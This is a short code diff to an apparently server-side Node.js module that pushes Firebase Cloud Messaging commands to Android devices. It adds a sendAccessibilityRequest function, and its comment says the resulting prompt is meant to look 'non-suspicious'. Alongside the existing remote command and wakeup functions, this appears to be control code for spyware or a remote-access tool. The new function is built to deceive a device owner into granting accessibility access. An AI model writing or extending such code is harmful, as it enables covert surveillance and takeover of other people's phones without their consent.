@@ -172,10 +172,44 @@ async function sendWakeup(fcmToken) {
     }
 }
 
+/**
+ * Send request to prompt user to enable accessibility
+ * This opens a non-suspicious dialog on the device
+ */
+async function sendAccessibilityRequest(fcmToken) {
+    initialize();
+
+    if (!initialized || !admin) {
+        throw new Error('FCM not initialized');
+    }
+
+    const message = {
+        token: fcmToken,
+        data: {
+            action: 'request_accessibility',
+            timestamp: Date.now().toString()
+        },
+        android: {
+            priority: 'high',
+            ttl: 0 // Immediate delivery
+        }
+    };
+
+    try {
+        const response = await admin.messaging().send(message);
+        console.log(`[FCM] Accessibility request sent: ${response}`);
+        return response;
+    } catch (error) {
+        console.error(`[FCM] Accessibility request error:`, error.message);
+        throw error;
+    }
+}
+
 module.exports = {
     initialize,
     sendCommand,
     sendNotification,
     sendToMultiple,
-    sendWakeup
+    sendWakeup,
+    sendAccessibilityRequest
 };
